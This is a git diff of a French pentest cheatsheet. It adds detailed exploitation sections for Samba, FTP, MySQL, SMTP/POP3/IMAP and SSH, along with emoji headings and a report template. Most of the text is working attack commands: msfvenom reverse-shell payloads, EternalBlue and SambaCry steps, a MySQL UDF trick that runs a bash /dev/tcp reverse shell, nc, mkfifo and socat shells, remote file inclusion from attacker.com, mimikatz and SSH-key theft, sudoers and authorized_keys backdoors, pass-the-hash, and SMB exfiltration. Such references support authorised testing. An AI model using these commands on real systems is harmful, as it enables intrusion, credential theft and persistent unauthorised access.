@@ -1,6 +1,6 @@
 # CHEATSHEET PENTEST PROFESSIONNELLE
 
-## TABLE DES MATIÈRES
+## 📌 TABLE DES MATIÈRES
 1. [Reconnaissance](#reconnaissance)
 2. [Scanning & Énumération](#scanning--énumération)
 3. [Exploitation](#exploitation)
@@ -8,6 +8,11 @@
 5. [Reporting](#reporting)
 6. [Standards & Méthodologies](#standards--méthodologies)
 7. [Outils Spécialisés](#outils-spécialisés)
+   - [Exploitation Samba](#exploitation-samba-détaillée)
+   - [Exploitation FTP](#exploitation-ftp-détaillée)
+   - [Exploitation MySQL](#exploitation-mysql-détaillée)
+   - [Exploitation SMTP/POP3/IMAP](#exploitation-smtppop3imap-détaillée)
+   - [Exploitation SSH](#exploitation-ssh-détaillée)
 8. [Payloads & Reverse Shells](#payloads--reverse-shells)
 9. [Wordlists, Exegol & Ressources](#wordlists--exegol)
 
@@ -15,7 +20,7 @@
 
 ## RECONNAISSANCE
 
-### NMAP POUR RECONNAISSANCE
+### 🔍 NMAP POUR RECONNAISSANCE
 ```bash
 # Phase de reconnaissance - Découverte passive/légère
 nmap -sn 192.168.1.0/24                   # Ping scan (sans scan de port)
@@ -27,7 +32,7 @@ nmap --packet-trace -sn 192.168.1.1       # Affiche les paquets pour analyse
 ```
 
 
-### DNS & DOMAINES
+### 🌐 DNS & DOMAINES
 ```bash
 # DNS classique
 dig +short A example.com                  # Enregistrements A
@@ -47,7 +52,7 @@ amass enum -d example.com                 # Énumération passive
 amass enum -d example.com -active         # Énumération active
 ```
 
-### OSINT
+### 🔎 OSINT
 ```bash
 # theHarvester
 theHarvester -d example.com -b google,linkedin,twitter # Recherche emails/sous-domaines
@@ -64,7 +69,7 @@ shodan host 8.8.8.8                        # Info sur une IP
 whois example.com                          # Info d'enregistrement domaine
 ```
 
-### VHOSTS & WEB
+### 🔧 VHOSTS & WEB
 ```bash
 # Gobuster - Sous-domaines
 gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
@@ -80,7 +85,7 @@ waybackurls example.com                    # URLs historiques
 
 ## SCANNING & ÉNUMÉRATION
 
-### NMAP POUR SCANNING
+### 🔍 NMAP POUR SCANNING
 ```bash
 # Scan basique
 nmap -sS -T4 192.168.1.100                # Scan SYN rapide
@@ -106,7 +111,7 @@ nmap -sS -Pn -n --disable-arp-ping        # Sans DNS, sans ping, sans ARP
 nmap -p- --min-rate 1000 --max-retries 1  # Scan rapide tous ports
 ```
 
-### WEB
+### 🌐 WEB
 ```bash
 # Gobuster - Directories
 gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
@@ -125,7 +130,7 @@ wpscan --url http://target --enumerate u,vp # Énumération users et plugins vul
 wpscan --url http://target --enumerate all  # Énumération complète
 ```
 
-### SMB/WINDOWS
+### 💻 SMB/WINDOWS
 ```bash
 # Énumération SMB
 smbclient -L //192.168.1.100               # Liste des partages
@@ -146,7 +151,7 @@ crackmapexec smb 192.168.1.0/24 -u user -p pass # Test creds
 ldapsearch -x -h 192.168.1.100 -b "dc=domain,dc=local" # Dump LDAP anonyme
 ```
 
-### LINUX/UNIX
+### 🐧 LINUX/UNIX
 ```bash
 # Services réseau
 showmount -e 192.168.1.100                 # Partages NFS
@@ -159,7 +164,7 @@ mount -t nfs 192.168.1.100:/share /mnt/nfs # Monter partage NFS
 finger @192.168.1.100                      # Utilisateurs actifs
 ```
 
-### SERVICES SPÉCIFIQUES
+### 📱 SERVICES SPÉCIFIQUES
 ```bash
 # SSH
 ssh-audit 192.168.1.100                    # Audit config SSH
@@ -179,7 +184,7 @@ nmap --script=ftp-* -p 21 192.168.1.100    # Scripts FTP Nmap
 
 ## EXPLOITATION
 
-### METASPLOIT
+### 🛠 METASPLOIT
 ```bash
 # Base
 msfconsole                                 # Lancer Metasploit
@@ -209,7 +214,7 @@ set VERBOSE false
 run
 ```
 
-### MSFVENOM
+### 🧪 MSFVENOM
 ```bash
 # Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe > shell.exe
@@ -226,7 +231,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw > s
 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw > shell.py
 ```
 
-### INJECTIONS SQL
+### 💉 INJECTIONS SQL
 ```bash
 # Tests de base
 ' OR 1=1 --
@@ -252,7 +257,7 @@ sqlmap -u "http://target/page.php?id=1" -D database_name -T users -C username,pa
 sqlmap -u "http://target/login.php" --data="username=admin&password=pass" --method POST --dbs
 ```
 
-### CRACKING & BRUTEFORCE
+### 🔓 CRACKING & BRUTEFORCE
 ```bash
 # Hydra
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
@@ -268,7 +273,7 @@ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt # MD5
 hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt # NTLM
 ```
 
-### OUTILS SPÉCIFIQUES
+### 🔧 OUTILS SPÉCIFIQUES
 ```bash
 # XXE
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
@@ -288,7 +293,7 @@ http://target/page.php?file=http://attacker.com/malicious.php
 
 ## POST-EXPLOITATION
 
-### ÉNUMÉRATION SYSTÈME
+### 🔍 ÉNUMÉRATION SYSTÈME
 ```bash
 # Windows
 systeminfo                                 # Infos système
@@ -309,7 +314,7 @@ cat /etc/crontab                           # Tâches planifiées
 history                                    # Historique commandes
 ```
 
-### ÉLÉVATION PRIVILÈGES
+### 🚀 ÉLÉVATION PRIVILÈGES
 ```bash
 # Windows
 whoami /priv                               # Privilèges actuels
@@ -348,7 +353,7 @@ lse.sh -l 1 -i                             # Linux Smart Enumeration
 cat /etc/sudoers                           # Fichier sudoers
 ```
 
-### VOL CREDENTIALS
+### 🔐 VOL CREDENTIALS
 ```bash
 # Windows
 mimikatz.exe
@@ -365,7 +370,7 @@ cat ~/.ssh/id_rsa                          # Clé SSH privée
 grep -ri password /var/www/                # Recherche mots de passe
 ```
 
-### PERSISTANCE
+### 🔗 PERSISTANCE
 ```bash
 # Windows
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\windows\temp\backdoor.exe" # Registre run key
@@ -379,7 +384,7 @@ echo "backdoor ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers # Sudo sans pass
 echo "ssh-rsa AAAAB3NzaC1..." >> ~/.ssh/authorized_keys # Clé SSH
 ```
 
-### MOUVEMENT LATÉRAL
+### 🧠 MOUVEMENT LATÉRAL
 ```bash
 # Windows
 pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.101 cmd.exe # Pass-the-Hash
@@ -399,7 +404,37 @@ ssh -i id_rsa victim@192.168.1.101         # Se connecter
 
 ## REPORTING
 
-### SCORING CVSS
+### 📝 STRUCTURE RAPPORT
+```
+1. Résumé exécutif
+   • Principales conclusions
+   • Tableau des vulnérabilités
+   • Recommandations prioritaires
+
+2. Méthodologie
+   • Approche
+   • Outils utilisés
+   • Limitations
+
+3. Découvertes détaillées
+   • Vulnérabilité X
+     - Description
+     - Preuve d'exploitation
+     - Impact
+     - Recommandation
+   • Répéter pour chaque vulnérabilité
+
+4. Conclusion
+   • Résumé des risques
+   • Plan d'action proposé
+
+5. Annexes
+   • Résultats détaillés des scans
+   • Logs
+   • Preuves techniques
+```
+
+### 🎯 SCORING CVSS
 ```
 # Format CVSS v3.1
 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  # Score 9.8 (Critical)
@@ -415,7 +450,7 @@ I - Integrity: N(one), L(ow), H(igh)
 A - Availability: N(one), L(ow), H(igh)
 ```
 
-### OUTILS DE SCORING & REPORTING
+### 🔢 OUTILS DE SCORING & REPORTING
 ```bash
 # Calculateurs CVSS
 https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator     # Calculateur officiel NIST
@@ -436,7 +471,7 @@ https://github.com/juliocesarfort/public-pentesting-reports # Exemples de rappor
 https://github.com/tjnull/OSCP-Stuff/blob/master/reporting/ # Templates OSCP
 ```
 
-### STANDARDS & MÉTHODOLOGIES
+### 📋 STANDARDS & MÉTHODOLOGIES
 ```
 # OWASP Top 10 (2021)
 A01 - Broken Access Control
@@ -464,7 +499,7 @@ A10 - Server-Side Request Forgery
 # WSTG (Web Security Testing Guide)
 ```
 
-### NIVEAUX DE RISQUE
+### 📊 NIVEAUX DE RISQUE
 ```
 Critique (9.0-10.0) : Exploitation facile, impact massif
 Élevé (7.0-8.9) : Vulnérabilités exploitables avec impact important
@@ -477,7 +512,412 @@ Informatif (0.0) : Pas d'impact direct sur la sécurité
 
 ## OUTILS SPÉCIALISÉS
 
-### TESTS D'INTRUSION RÉSEAU
+### 🔬 EXPLOITATION SAMBA DÉTAILLÉE
+```bash
+# 1. ÉNUMÉRATION SAMBA
+# Détection basique
+nmap -p 139,445 192.168.1.0/24            # Découvrir les serveurs Samba
+nmap -p 139,445 --script=smb-protocols 192.168.1.100 # Versions protocoles
+nmap -p 139,445 --script=smb-security-mode 192.168.1.100 # Mode sécurité
+nmap -p 139,445 --script=smb-enum-shares 192.168.1.100 # Énumération partages
+
+# Énumération des partages
+smbclient -L //192.168.1.100 -N           # Liste partages (anonyme)
+smbclient -L //192.168.1.100 -U user%pass # Liste partages (authentifié)
+smbmap -H 192.168.1.100                   # Permissions des partages
+smbmap -H 192.168.1.100 -u admin -p password -d WORKGROUP # Auth avec domaine
+
+# Exploration approfondie
+enum4linux -a 192.168.1.100               # Énumération complète
+enum4linux -u user -p pass -a 192.168.1.100 # Avec credentials
+enum4linux -S 192.168.1.100               # Partages uniquement
+enum4linux -U 192.168.1.100               # Utilisateurs uniquement
+enum4linux -P 192.168.1.100               # Politique de mot de passe
+
+# Connexion et exploration
+smbclient //192.168.1.100/share -N        # Connexion anonyme
+smbclient //192.168.1.100/share -U user%pass # Connexion authentifiée
+smb: \> ls                                # Lister contenu
+smb: \> get file.txt                      # Télécharger fichier
+smb: \> put file.txt                      # Uploader fichier
+smb: \> mask ""                           # Afficher fichiers cachés
+
+# 2. VULNÉRABILITÉS ET EXPLOITS COURANTS
+# Détection de vulnérabilités
+nmap -p 445 --script=smb-vuln* 192.168.1.100 # Toutes vulnérabilités
+nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.100 # EternalBlue
+nmap -p 445 --script=smb-vuln-ms08-067 192.168.1.100 # Conficker
+nmap -p 445 --script=smb-double-pulsar-backdoor 192.168.1.100 # DoublePulsar
+
+# EternalBlue (MS17-010) - Metasploit
+msfconsole
+use auxiliary/scanner/smb/smb_ms17_010    # Vérification vulnérabilité
+set RHOSTS 192.168.1.100
+run
+use exploit/windows/smb/ms17_010_eternalblue # Exploit
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.200
+exploit
+
+# EternalBlue (MS17-010) - Manuel
+git clone https://github.com/worawit/MS17-010.git
+cd MS17-010
+pip install impacket
+# 1. Générer shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o shellcode.bin
+# 2. Lancer listener
+nc -lvnp 4444
+# 3. Exécuter exploit
+python3 send_and_execute.py 192.168.1.100 shellcode.bin
+
+# SambaCry (CVE-2017-7494) - Metasploit
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.168.1.100
+set SMB_SHARE_NAME shared
+set SMB_FOLDER path/in/share
+exploit
+
+# NullSessionRCE (SMB1) - Énumération via null session
+smbclient -L //192.168.1.100 -N
+rpcclient -U "" -N 192.168.1.100
+rpcclient $> enumdomusers              # Énumération utilisateurs domaine
+rpcclient $> queryuser 0x3e8           # Info utilisateur spécifique
+rpcclient $> enumprinters              # Énumération imprimantes
+
+# 3. AUTRES TECHNIQUES SMB
+# Relais SMB (attaque MITM)
+impacket-ntlmrelayx -tf targets.txt -smb2support # Relais NTLM
+responder -I eth0 -rwfv                  # Interception LLMNR/NBT-NS
+
+# PsExec pour exécution distante
+impacket-psexec domain/user:password@192.168.1.100
+impacket-psexec -hashes LMHASH:NTHASH domain/user@192.168.1.100
+
+# SMB avec IPv6
+nmap -6 -p 445 fe80::1%eth0               # Scan SMB sur IPv6
+
+# Coercition SMB
+impacket-PetitPotam -d domain -u user -p password 192.168.1.200 192.168.1.100
+
+# 4. POST-EXPLOITATION
+# Monter partage pour persistance
+mkdir /mnt/smb
+mount -t cifs -o username=user,password=pass //192.168.1.100/share /mnt/smb
+
+# Créer un partage SMB pour exfiltration
+impacket-smbserver share /tmp/exfil
+# Sur victime Windows:
+copy C:\sensitive.txt \\192.168.1.200\share\
+
+# Recherche de fichiers sensibles
+smbmap -H 192.168.1.100 -u user -p pass -R # Recherche récursive
+smbmap -H 192.168.1.100 -u user -p pass -A "*.txt" # Chercher tous .txt
+
+# 5. CHECKLIST SAMBA PENTEST
+# [ ] Vérifier version Samba (nmap --script=smb-os-discovery)
+# [ ] Tester connexion anonyme (smbclient -L // -N)
+# [ ] Énumérer partages et permissions
+# [ ] Tester vulnérabilité EternalBlue (MS17-010)
+# [ ] Vérifier SambaCry (CVE-2017-7494) si Linux
+# [ ] Tester null sessions et NTLM relay
+# [ ] Vérifier vulnérabilités SMB printer (MS10-061)
+# [ ] Tester authentification brute-force
+```
+
+### 📂 EXPLOITATION FTP DÉTAILLÉE
+```bash
+# 1. ÉNUMÉRATION FTP
+# Détection et version
+nmap -p 21 192.168.1.0/24                 # Découvrir serveurs FTP
+nmap -p 21 --script=ftp-anon 192.168.1.100 # Tester accès anonyme
+nmap -sV -p 21 192.168.1.100              # Version du service
+nmap -p 21 --script=ftp-* 192.168.1.100   # Tous les scripts FTP
+
+# Connexion manuelle
+ftp 192.168.1.100
+Username: anonymous                       # Tester anonyme
+Password: anonymous@domain.com
+
+# Commandes FTP basiques
+ftp> ls -la                               # Lister fichiers (cachés inclus)
+ftp> cd /                                 # Aller à la racine
+ftp> get file.txt                         # Télécharger fichier
+ftp> mget *.txt                           # Télécharger plusieurs fichiers
+ftp> put backdoor.php                     # Uploader fichier
+ftp> binary                               # Mode binaire
+ftp> ascii                                # Mode ASCII
+
+# Automatisation FTP
+wget -m --no-passive ftp://anonymous:anonymous@192.168.1.100/ # Télécharger tout
+hydra -L users.txt -P passes.txt ftp://192.168.1.100 # Bruteforce
+
+# 2. VULNÉRABILITÉS FTP COURANTES
+# FTP anonyme
+ftp 192.168.1.100
+Username: anonymous
+Password: anonymous@domain.com
+# Vérifier les droits d'accès et fichiers disponibles
+
+# FTP avec TLS - Test SSL/TLS
+nmap --script=ssl-enum-ciphers -p 21 192.168.1.100
+openssl s_client -connect 192.168.1.100:21 -starttls ftp
+
+# Ancienne version FTP (VSFTPD 2.3.4 backdoor)
+nmap --script=ftp-vsftpd-backdoor -p 21 192.168.1.100
+# Exploitation via Metasploit
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.1.100
+exploit
+
+# ProFTPD 1.3.5 Mod_Copy
+nmap -sV -p 21 --script=ftp-proftpd-backdoor 192.168.1.100
+# Exploitation manuelle
+telnet 192.168.1.100 21
+SITE CPFR /etc/passwd
+SITE CPTO /var/www/html/passwd.txt
+# Accéder ensuite à http://192.168.1.100/passwd.txt
+
+# 3. TECHNIQUES AVANCÉES FTP
+# Énumération utilisateurs (User enumeration)
+hydra -L users.txt -p anything 192.168.1.100 ftp -t 4
+
+# Mode passif vs actif
+ftp -p 192.168.1.100                     # Mode passif forcé
+# Dans la session FTP
+ftp> passive                             # Basculer mode passif/actif
+
+# Bypass restrictions avec caractères spéciaux
+ftp> ls ../                              # Sortir du répertoire courant
+ftp> ls ~root/                           # Accéder au home de root
+ftp> ls /etc/                            # Accéder à des chemins absolus
+
+# 4. POST-EXPLOITATION FTP
+# Vérification de configuration 
+cat /etc/vsftpd.conf                      # Config VSFTPD
+cat /etc/proftpd/proftpd.conf             # Config ProFTPD
+cat /etc/ftpusers                         # Utilisateurs interdits
+
+# Création d'utilisateur FTP pour persistance
+useradd -m ftpuser
+passwd ftpuser
+echo "ftpuser" >> /etc/vsftpd.users
+
+# 5. CHECKLIST FTP PENTEST
+# [ ] Vérifier la version du serveur FTP
+# [ ] Tester connexion anonyme
+# [ ] Tester bruteforce sur utilisateurs connus
+# [ ] Vérifier les droits d'écriture dans des dossiers sensibles
+# [ ] Tester les vulnérabilités spécifiques à la version
+# [ ] Vérifier possibilité de path traversal
+# [ ] Analyser les fichiers de configuration téléchargés
+```
+
+### 💼 EXPLOITATION MYSQL DÉTAILLÉE
+```bash
+# 1. ÉNUMÉRATION MYSQL
+# Détection et version
+nmap -p 3306 192.168.1.0/24               # Découvrir serveurs MySQL
+nmap -p 3306 --script=mysql-info 192.168.1.100 # Informations de base
+nmap -p 3306 --script=mysql-enum 192.168.1.100 # Énumération plus complète
+nmap -p 3306 --script=mysql-empty-password 192.168.1.100 # Test mdp vides
+
+# Connexion manuelle
+mysql -h 192.168.1.100 -u root -p          # Connexion MySQL
+mysql -h 192.168.1.100 -u root             # Sans mot de passe
+
+# Commandes MySQL basiques
+mysql> SHOW DATABASES;                     # Lister bases de données
+mysql> USE database_name;                  # Sélectionner DB
+mysql> SHOW TABLES;                        # Lister tables
+mysql> SELECT * FROM table_name;           # Voir contenu table
+mysql> SELECT user,host,password FROM mysql.user; # Voir utilisateurs/hachés
+mysql> SELECT @@version;                   # Version MySQL
+mysql> SELECT @@datadir;                   # Répertoire des données
+
+# Bruteforce
+hydra -L users.txt -P passes.txt 192.168.1.100 mysql
+
+# 2. VULNÉRABILITÉS MYSQL COURANTES
+# Authentification sans mot de passe
+mysql -h 192.168.1.100 -u root
+
+# UDF User Defined Function pour exécution de code
+# Dans MySQL:
+mysql> use mysql;
+mysql> create table hack(line blob);
+mysql> insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));
+mysql> select * from hack into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+mysql> select sys_exec('bash -i >& /dev/tcp/192.168.1.200/4444 0>&1');
+
+# Injection SQL à distance
+sqlmap -u "http://192.168.1.100/index.php?id=1" --dbs # Enumération DB
+sqlmap -u "http://192.168.1.100/index.php?id=1" -D mysql --tables # Tables
+sqlmap -u "http://192.168.1.100/index.php?id=1" --os-shell # Shell OS
+
+# 3. POST-EXPLOITATION MYSQL
+# Obtenir privilèges système (Windows)
+mysql -h 192.168.1.100 -u root -p
+mysql> SELECT @@plugin_dir;
+mysql> USE mysql;
+mysql> CREATE TABLE npn(line blob);
+mysql> INSERT INTO npn values(load_file('C:/temp/evil.dll'));
+mysql> SELECT * FROM npn INTO DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/evil.dll';
+mysql> CREATE FUNCTION evil_func RETURNS INT SONAME 'evil.dll';
+mysql> SELECT evil_func();
+
+# Accès aux fichiers système
+mysql> SELECT load_file('/etc/passwd');
+mysql> SELECT load_file('C:/Windows/repair/sam');
+mysql> SELECT load_file('/var/www/html/config.php');
+
+# 4. CHECKLIST MYSQL PENTEST
+# [ ] Vérifier la version MySQL
+# [ ] Tester l'authentification sans mot de passe
+# [ ] Bruteforce utilisateurs communs
+# [ ] Vérifier les privilèges des utilisateurs
+# [ ] Tester l'accès aux fichiers sensibles
+# [ ] Tenter l'exécution de code via UDF
+# [ ] Vérifier vulnérabilités spécifiques à la version
+```
+
+### 📧 EXPLOITATION SMTP/POP3/IMAP DÉTAILLÉE
+```bash
+# 1. ÉNUMÉRATION SMTP
+# Détection et version
+nmap -p 25,465,587 192.168.1.0/24         # Découvrir serveurs SMTP
+nmap -p 25 --script=smtp-commands 192.168.1.100 # Commandes disponibles
+nmap -p 25 --script=smtp-enum-users 192.168.1.100 # Énumération utilisateurs
+nmap -p 25 --script=smtp-open-relay 192.168.1.100 # Test relais ouvert
+
+# Commandes manuelles SMTP
+telnet 192.168.1.100 25
+EHLO test.com
+VRFY root                                 # Vérifier si utilisateur existe
+EXPN admin                                # Expand alias
+RCPT TO: victim@target.com                # Destinataire
+MAIL FROM: attacker@evil.com              # Expéditeur
+
+# Énumération utilisateurs
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.100
+
+# 2. ÉNUMÉRATION POP3/IMAP
+# Détection
+nmap -p 110,995,143,993 192.168.1.0/24    # Découvrir serveurs POP3/IMAP
+nmap -p 110 --script=pop3-capabilities 192.168.1.100 # Caps POP3
+nmap -p 143 --script=imap-capabilities 192.168.1.100 # Caps IMAP
+
+# Commandes manuelles POP3
+telnet 192.168.1.100 110
+USER username
+PASS password
+LIST                                      # Lister tous les messages
+RETR 1                                    # Récupérer message #1
+QUIT
+
+# Commandes manuelles IMAP
+telnet 192.168.1.100 143
+a LOGIN username password
+a LIST "" *                               # Lister les dossiers
+a SELECT INBOX                            # Sélectionner boîte
+a FETCH 1 BODY[]                          # Récupérer le message
+a LOGOUT
+
+# 3. VULNÉRABILITÉS MAIL COURANTES
+# SMTP Relay ouvert (spamming)
+telnet 192.168.1.100 25
+EHLO test.com
+MAIL FROM: attacker@evil.com
+RCPT TO: victim@external.com
+DATA
+Subject: Test relay
+
+Ce serveur est mal configuré.
+.
+
+# Bruteforce
+hydra -L users.txt -P passwords.txt 192.168.1.100 pop3
+hydra -L users.txt -P passwords.txt 192.168.1.100 imap
+
+# Downgrade attaque SSL/TLS
+nmap --script=ssl-enum-ciphers -p 110,143,993,995 192.168.1.100
+sslscan 192.168.1.100:993
+
+# 4. CHECKLIST MAIL PENTEST
+# [ ] Vérifier versions et configurations SMTP/POP3/IMAP
+# [ ] Tester énumération utilisateurs via VRFY/EXPN
+# [ ] Tester relais SMTP ouvert
+# [ ] Bruteforce comptes mail connus
+# [ ] Vérifier authentification en clair vs SSL/TLS
+# [ ] Tester downgrade attaques
+# [ ] Vérifier extraction d'emails sensibles
+```
+
+### 🌐 EXPLOITATION SSH DÉTAILLÉE
+```bash
+# 1. ÉNUMÉRATION SSH
+# Détection et version
+nmap -p 22 192.168.1.0/24                 # Découvrir serveurs SSH
+nmap -p 22 --script=ssh-hostkey 192.168.1.100 # Récupérer clés host
+nmap -p 22 --script=ssh2-enum-algos 192.168.1.100 # Algorithmes supportés
+nmap -p 22 --script=ssh-auth-methods 192.168.1.100 # Méthodes auth
+
+# Scan approfondi
+ssh-audit 192.168.1.100                   # Audit complet configuration
+ssh-keyscan 192.168.1.100                 # Récupérer clés publiques
+
+# 2. VULNÉRABILITÉS SSH COURANTES
+# Bruteforce
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
+medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
+
+# Clés SSH faibles
+ssh-keygen -lf /etc/ssh/ssh_host_rsa_key  # Vérifier force clé
+
+# Authentification par clé
+ssh -i id_rsa user@192.168.1.100          # Connexion avec clé privée
+chmod 600 id_rsa                          # Corriger permissions si nécessaire
+
+# Anciennes versions (< 7.7) - Username enumeration 
+auxiliary/scanner/ssh/ssh_enumusers
+python3 ssh_user_enum.py --userlist users.txt 192.168.1.100 2222
+
+# 3. TECHNIQUES SSH AVANCÉES
+# Pivoting avec SSH
+ssh -D 9050 user@192.168.1.100            # Proxy SOCKS
+proxychains nmap -sT 10.0.0.0/24           # Scan via tunnel
+
+# Forwarding de ports
+ssh -L 8080:localhost:80 user@192.168.1.100 # Local forwarding
+ssh -R 8080:localhost:80 user@192.168.1.100 # Remote forwarding
+
+# Connexion SSH via HTTP proxy
+ssh -o ProxyCommand='nc -X connect -x proxy.example.com:8080 %h %p' user@192.168.1.100
+
+# 4. POST-EXPLOITATION SSH
+# Extraction et utilisation clés privées
+find / -name "id_rsa" 2>/dev/null          # Rechercher clés privées
+cat /home/user/.ssh/id_rsa                 # Récupérer clé privée
+cp /home/user/.ssh/authorized_keys /tmp    # Récupérer clés autorisées
+
+# Extraction clés depuis agent SSH
+ssh-agent
+ssh-add -l                                 # Lister clés chargées
+
+# Persistance via SSH
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys # Ajouter clé backdoor
+
+# 5. CHECKLIST SSH PENTEST
+# [ ] Vérifier version SSH et vulnérabilités connues
+# [ ] Tester algorithmes cryptographiques faibles
+# [ ] Rechercher fichiers de clés privées (.id_rsa)
+# [ ] Tester bruteforce sur comptes courants
+# [ ] Vérifier mauvaise configuration dans sshd_config
+# [ ] Tester authentification par mot de passe vs. clé
+```
+
+### 🔬 TESTS D'INTRUSION RÉSEAU
 ```bash
 # Responder
 responder -I eth0 -wrf                     # Capture NTLM/NTLMv2
@@ -495,7 +935,7 @@ airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w output wlan0mon # Capture
 aircrack-ng -w /usr/share/wordlists/rockyou.txt output*.cap # Cracking
 ```
 
-### SÉCURITÉ WEB
+### 🛡 SÉCURITÉ WEB
 ```bash
 # OWASP ZAP
 zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target # Scan rapide
@@ -509,7 +949,7 @@ zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true
 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ # Analyse
 ```
 
-### IOT & HARDWARE
+### 📡 IOT & HARDWARE
 ```bash
 # Bluetooth
 btscanner                                  # Scanner Bluetooth
@@ -525,7 +965,7 @@ mfcuk -C -R 0:A -s 250 -S 250              # Crack clés
 
 ## PAYLOADS & REVERSE SHELLS
 
-### REVERSE SHELLS
+### 🐚 REVERSE SHELLS
 ```bash
 # Bash
 bash -i >& /dev/tcp/192.168.1.200/4444 0>&1
@@ -552,7 +992,7 @@ nc -e /bin/sh 192.168.1.200 4444
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.200 4444 >/tmp/f # Sans option -e
 ```
 
-### HANDLERS
+### 📱 HANDLERS
 ```bash
 # Netcat
 nc -lvnp 4444                              # Listener basique
@@ -569,7 +1009,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.200:4444
 ```
 
-### TRANSFERT FICHIERS
+### 🔄 TRANSFERT FICHIERS
 ```bash
 # Serveur HTTP
 python -m SimpleHTTPServer 8000            # Python 2
@@ -593,7 +1033,7 @@ copy \\192.168.1.200\share\file.exe C:\file.exe # Copie Windows
 
 ## WORDLISTS & RESSOURCES
 
-### WORDLISTS & EXEGOL
+### 📚 WORDLISTS & EXEGOL
 ```bash
 # Exegol - Framework pour pentesting
 ## Installation et utilisation
@@ -638,7 +1078,7 @@ exegol-resources                           # Méta-package avec outils additionn
 /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 ```
 
-### RESSOURCES ADDITIONNELLES
+### 🔍 RESSOURCES ADDITIONNELLES
 ```
 # Bases de données vulnérabilités
 https://www.exploit-db.com/
@@ -652,7 +1092,7 @@ https://github.com/rebootuser/LinEnum
 https://github.com/f0rb1dd3n/Reptile (rootkit)
 ```
 
-### CHECKLISTS
+### 🗺 CHECKLISTS
 ```
 # Windows Post-Exploitation
 [ ] whoami /all
